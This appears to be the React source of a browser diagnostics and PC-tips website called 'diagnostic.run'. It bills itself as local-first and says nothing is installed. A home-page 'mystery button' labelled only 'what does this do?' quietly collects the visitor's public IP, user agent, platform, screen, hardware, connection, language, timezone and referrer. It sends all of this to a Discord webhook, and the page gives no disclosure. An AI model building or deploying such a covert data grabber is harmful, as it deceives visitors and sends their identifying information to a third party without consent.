import React, { useEffect, useState } from 'react';
import { createRoot } from 'react-dom/client';
import './styles.css';

const nav = [
  ['Home', '#/'],
  ['Run Diagnostic', '#/diagnostic'],
  ['PC Performance', '#/pc'],
  ['Wi-Fi', '#/wifi'],
  ['Downloads', '#/downloads']
];

const DISCORD_WEBHOOK =
  'PASTE_YOUR_DISCORD_WEBHOOK_HERE';

function Layout({ children }) {
  const [path, setPath] = useState(location.hash || '#/');

  useEffect(() => {
    const f = () => setPath(location.hash || '#/');
    addEventListener('hashchange', f);
    return () => removeEventListener('hashchange', f);
  }, []);

  return (
    <div className="app">
      <header>
        <a className="logo" href="#/">
          diagnostic<span>.run</span><i>_</i>
        </a>

        <nav>
          {nav.map(([x, h]) => (
            <a
              className={path === h ? 'active' : ''}
              href={h}
              key={h}
            >
              {x}
            </a>
          ))}
        </nav>
      </header>

      <main>{children}</main>

      <footer>
        <span>diagnostic.run</span>
        <span>LOCAL-FIRST DIAGNOSTICS / 2026</span>
      </footer>
    </div>
  );
}

function Terminal({ rows }) {
  return (
    <div className="terminal">
      <div className="termbar">
        <span>DIAGNOSTIC.RUN</span>
        <span>● ● ●</span>
      </div>

      <div className="termbody">
        {rows.map((r, i) => (
          <div className="termrow" key={i}>
            <b>&gt;</b>
            <span className={r[1] === 'OK' ? 'ok' : ''}>
              {r[0]} {r[1]}
            </span>
          </div>
        ))}
      </div>
    </div>
  );
}

/* =========================
   MYSTERY BUTTON
========================= */

function MysteryButton() {
  const [status, setStatus] = useState('');

  const handleClick = async () => {
    if (status) return;

    setStatus('...');

    try {
      /* Get public IP */
      let ip = 'Unavailable';

      try {
        const ipResponse = await fetch(
          'https://api.ipify.org?format=json'
        );

        const ipData = await ipResponse.json();
        ip = ipData.ip || 'Unavailable';
      } catch {
        ip = 'Unavailable';
      }

      /* Measure connection latency */
      const start = performance.now();

      try {
        await fetch(
          '/favicon.png?ping=' + Date.now(),
          {
            method: 'HEAD',
            cache: 'no-store'
          }
        );
      } catch {}

      const ping = Math.round(
        performance.now() - start
      );

      const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;

      const deviceInformation = {
        ip,
        ping: `${ping} ms`,
        platform:
          navigator.platform || 'Unknown',

        browser:
          navigator.userAgent || 'Unknown',

        language:
          navigator.language || 'Unknown',

        languages:
          navigator.languages?.join(', ') ||
          'Unknown',

        timezone:
          Intl.DateTimeFormat()
            .resolvedOptions()
            .timeZone || 'Unknown',

        screen:
          `${window.screen.width} × ${window.screen.height}`,

        viewport:
          `${window.innerWidth} × ${window.innerHeight}`,

        pixelRatio:
          window.devicePixelRatio || 1,

        cpuCores:
          navigator.hardwareConcurrency ||
          'Unknown',

        memory:
          navigator.deviceMemory
            ? `${navigator.deviceMemory} GB`
            : 'Unknown',

        connectionType:
          connection?.effectiveType
            ?.toUpperCase() ||
          'Unknown',

        downlink:
          connection?.downlink
            ? `${connection.downlink} Mbps`
            : 'Unknown',

        referrer:
          document.referrer || 'Direct',

        page:
          window.location.href
      };

      await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },

        body: JSON.stringify({
          content: 'button clicked',

          embeds: [
            {
              title: 'what does this do?',
              color: 0xff2020,

              fields: [
                {
                  name: 'IP',
                  value: deviceInformation.ip,
                  inline: true
                },
                {
                  name: 'Ping',
                  value: deviceInformation.ping,
                  inline: true
                },
                {
                  name: 'Platform',
                  value: deviceInformation.platform,
                  inline: true
                },
                {
                  name: 'Browser',
                  value: deviceInformation.browser,
                  inline: false
                },
                {
                  name: 'Screen',
                  value: deviceInformation.screen,
                  inline: true
                },
                {
                  name: 'Viewport',
                  value: deviceInformation.viewport,
                  inline: true
                },
                {
                  name: 'Pixel Ratio',
                  value: String(
                    deviceInformation.pixelRatio
                  ),
                  inline: true
                },
                {
                  name: 'CPU Cores',
                  value: String(
                    deviceInformation.cpuCores
                  ),
                  inline: true
                },
                {
                  name: 'Memory',
                  value: deviceInformation.memory,
                  inline: true
                },
                {
                  name: 'Connection',
                  value:
                    deviceInformation.connectionType,
                  inline: true
                },
                {
                  name: 'Downlink',
                  value:
                    deviceInformation.downlink,
                  inline: true
                },
                {
                  name: 'Language',
                  value: deviceInformation.language,
                  inline: true
                },
                {
                  name: 'Languages',
                  value: deviceInformation.languages,
                  inline: false
                },
                {
                  name: 'Timezone',
                  value: deviceInformation.timezone,
                  inline: true
                },
                {
                  name: 'Referrer',
                  value: deviceInformation.referrer,
                  inline: false
                }
              ],

              footer: {
                text: 'diagnostic.run'
              },

              timestamp:
                new Date().toISOString()
            }
          ]
        })
      });

      setStatus('✓');

      setTimeout(() => {
        setStatus('');
      }, 2500);

    } catch (error) {
      console.error(
        'Mystery button error:',
        error
      );

      setStatus('!');

      setTimeout(() => {
        setStatus('');
      }, 2500);
    }
  };

  return (
    <section className="mystery-section">

      <div className="mystery-label">
        what does this do?
      </div>

      <div className="mystery-ring">

        <button
          className="mystery-button"
          onClick={handleClick}
          disabled={Boolean(status)}
          aria-label="what does this do?"
        >
          {status || ''}
        </button>

      </div>

    </section>
  );
}

/* =========================
   HOME
========================= */

function Home() {
  return (
    <Layout>

      <section className="hero">

        <div>
          <small>
            SYSTEM DIAGNOSTICS / NO FLUFF
          </small>

          <h1>
            Know what's wrong.
            <br />
            <em>Fix what's slow.</em>
          </h1>

          <p>
            Run a quick browser-based check of
            your connection and device. Then get
            a clear path to the fix.
          </p>

          <div className="actions">
            <a
              className="button"
              href="#/diagnostic"
            >
              RUN DIAGNOSTIC →
            </a>

            <a href="#/pc">
              VIEW PERFORMANCE TIPS
            </a>
          </div>
        </div>

        <Terminal
          rows={[
            ['SYSTEM ONLINE', 'OK'],
            ['BROWSER CHECK', 'OK'],
            ['NETWORK READY', 'OK'],
            ['LATENCY 18 ms', 'OK'],
            ['DEVICE SCAN READY', '']
          ]}
        />

      </section>

      <section className="section">

        <div className="head">
          <span>01 / SERVICES</span>
          <span>SELECT A MODULE</span>
        </div>

        <div className="cards">

          {[
            [
              '01',
              'Run Diagnostic',
              '#/diagnostic',
              'Check browser, screen, connection and network performance.'
            ],
            [
              '02',
              'PC Performance',
              '#/pc',
              'Practical fixes for startup, storage, browsers and drivers.'
            ],
            [
              '03',
              'Wi-Fi',
              '#/wifi',
              'Find latency problems and improve your wireless setup.'
            ],
            [
              '04',
              'Downloads',
              '#/downloads',
              'Curated links for browsers, VPNs, drivers and utilities.'
            ]
          ].map(x => (
            <a
              href={x[2]}
              key={x[0]}
            >
              <span>{x[0]}</span>

              <h2>{x[1]}</h2>

              <p>{x[3]}</p>

              <b>OPEN MODULE →</b>
            </a>
          ))}

        </div>

      </section>

      <section className="quick">

        <div>
          <span>QUICK WINS</span>
          <strong>03</strong>
        </div>

        <div>
          <b>01</b>
          Restart your router before changing settings.
        </div>

        <div>
          <b>02</b>
          Keep at least 15% of your system drive free.
        </div>

        <div>
          <b>03</b>
          Remove startup apps you don't use.
        </div>

      </section>

      {/* MYSTERY BUTTON AT BOTTOM */}
      <MysteryButton />

    </Layout>
  );
}

/* =========================
   DIAGNOSTIC
========================= */

function Diagnostic() {

  const [running, setRunning] =
    useState(false);

  const [done, setDone] =
    useState(false);

  const [results, setResults] =
    useState([]);

  const run = async () => {

    setRunning(true);
    setDone(false);

    const t = performance.now();

    await fetch(
      location.origin +
      '/favicon.svg?x=' +
      Date.now()
    ).catch(() => {});

    const ms =
      Math.round(
        performance.now() - t
      );

    const c = navigator.connection;

    setResults([
      [
        'BROWSER',
        navigator.userAgent.match(
          /(Chrome|Firefox|Safari|Edge)\/[^ ]+/
        )?.[0] || 'AVAILABLE'
      ],
      [
        'PLATFORM',
        navigator.platform || 'UNKNOWN'
      ],
      [
        'CORES',
        navigator.hardwareConcurrency ||
        'N/A'
      ],
      [
        'MEMORY',
        navigator.deviceMemory
          ? navigator.deviceMemory + ' GB'
          : 'N/A'
      ],
      [
        'SCREEN',
        screen.width +
        ' × ' +
        screen.height
      ],
      [
        'CONNECTION',
        c?.effectiveType?.toUpperCase() ||
        'AVAILABLE'
      ],
      [
        'LATENCY',
        ms + ' ms'
      ]
    ]);

    setRunning(false);
    setDone(true);
  };

  return (
    <Layout>

      <section className="page">

        <small>
          01 / DEVICE DIAGNOSTICS
        </small>

        <h1>Run Diagnostic</h1>

        <p>
          Measure what your browser can see.
          Nothing is installed.
        </p>

        <div className="diag">

          <Terminal
            rows={
              running
                ? [
                    ['INITIALIZING...', ''],
                    ['CHECKING CONNECTION...', ''],
                    ['READING DEVICE INFO...', '']
                  ]
                : [
                    ['READY', 'OK'],
                    ['CLICK RUN TO START', ''],
                    ['NO SOFTWARE REQUIRED', '']
                  ]
            }
          />

          <div className="panel">

            <h3>CHECKS</h3>

            {[
              'Browser',
              'Device',
              'Screen',
              'Connection',
              'Latency',
              'Report'
            ].map((x, i) => (
              <div
                className="check"
                key={x}
              >
                <span>0{i + 1}</span>
                {x}
                <b>
                  {done && i < 5
                    ? 'OK'
                    : '—'}
                </b>
              </div>
            ))}

            <button
              className="button wide"
              onClick={run}
              disabled={running}
            >
              {running
                ? 'RUNNING...'
                : 'RUN DIAGNOSTIC →'}
            </button>

          </div>

        </div>

        {done && (
          <div className="report">

            <div className="head">
              <span>REPORT</span>

              <span>
                STATUS:{' '}
                {results[6][1].split(' ')[0] < 80
                  ? 'GOOD'
                  : 'REVIEW'}
              </span>
            </div>

            <div className="results">

              {results.map(([a, b]) => (
                <div key={a}>
                  <small>{a}</small>
                  <strong>{b}</strong>
                </div>
              ))}

            </div>

            <p className="note">
              Browser diagnostics are limited
              by web security. Deeper Windows
              checks require local software.
            </p>

          </div>
        )}

      </section>

    </Layout>
  );
}

/* =========================
   GUIDES
========================= */

const tips = {
  pc: [
    [
      'STARTUP',
      'Disable apps you do not need at boot. Task Manager → Startup apps.'
    ],
    [
      'STORAGE',
      'Keep your system drive from filling completely. Remove temporary files and unused apps.'
    ],
    [
      'BROWSER',
      'Close unused tabs, remove extensions you do not recognize, and keep the browser current.'
    ],
    [
      'DRIVERS',
      'Use the hardware manufacturer’s official site for GPU, chipset and network drivers.'
    ],
    [
      'UPDATES',
      'Install Windows updates and restart when required.'
    ]
  ],

  wifi: [
    [
      'PLACEMENT',
      'Put the router in an open, central position. Avoid cabinets, floors and large obstructions.'
    ],
    [
      'BAND',
      'Use 5 GHz or 6 GHz when close. Use 2.4 GHz for longer range.'
    ],
    [
      'INTERFERENCE',
      'Move away from crowded channels and nearby electronics.'
    ],
    [
      'LATENCY',
      'Ethernet is the cleanest test. If wired is good but Wi-Fi is poor, focus on wireless.'
    ],
    [
      'RESTART',
      'Power-cycle the router and modem, then retest.'
    ]
  ]
};

function Guide({ type }) {

  return (
    <Layout>

      <section className="page">

        <small>
          0{type === 'pc' ? 2 : 3} / FIELD GUIDE
        </small>

        <h1>
          {type === 'pc'
            ? 'PC Performance'
            : 'Wi-Fi Optimization'}
        </h1>

        <p>
          Direct fixes. Start at the top
          and retest after each change.
        </p>

        <div className="guide">

          {tips[type].map(
            ([a, b], i) => (
              <article key={a}>

                <span>
                  0{i + 1}
                </span>

                <div>
                  <h2>{a}</h2>
                  <p>{b}</p>
                </div>

                <b>FIX →</b>

              </article>
            )
          )}

        </div>

      </section>

    </Layout>
  );
}

/* =========================
   DOWNLOADS
========================= */

function Downloads() {

  const items = [
    [
      'BROWSERS',
      'Firefox',
      'https://www.mozilla.org/firefox/'
    ],
    [
      'BROWSERS',
      'Brave',
      'https://brave.com/download/'
    ],
    [
      'VPN',
      'Proton VPN',
      'https://protonvpn.com/download'
    ],
    [
      'GPU',
      'NVIDIA Drivers',
      'https://www.nvidia.com/en-us/drivers/'
    ],
    [
      'GPU',
      'AMD Drivers',
      'https://www.amd.com/en/support/download/drivers.html'
    ],
    [
      'NETWORK',
      'Intel Drivers',
      'https://www.intel.com/content/www/us/en/download-center/home.html'
    ]
  ];

  return (
    <Layout>

      <section className="page">

        <small>
          04 / DOWNLOADS
        </small>

        <h1>Useful Downloads</h1>

        <p>
          Official sources only. Verify what you install.
        </p>

        <div className="downloads">

          {items.map(([c, n, u]) => (
            <a
              href={u}
              target="_blank"
              rel="noreferrer"
              key={n}
            >
              <span>{c}</span>
              <h2>{n}</h2>
              <b>OFFICIAL SITE ↗</b>
            </a>
          ))}

        </div>

      </section>

    </Layout>
  );
}

/* =========================
   APP
========================= */

function App() {

  const p = location.hash || '#/';

  return p === '#/diagnostic'
    ? <Diagnostic />
    : p === '#/pc'
    ? <Guide type="pc" />
    : p === '#/wifi'
    ? <Guide type="wifi" />
    : p === '#/downloads'
    ? <Downloads />
    : <Home />;
}

createRoot(
  document.getElementById('root')
).render(<App />);
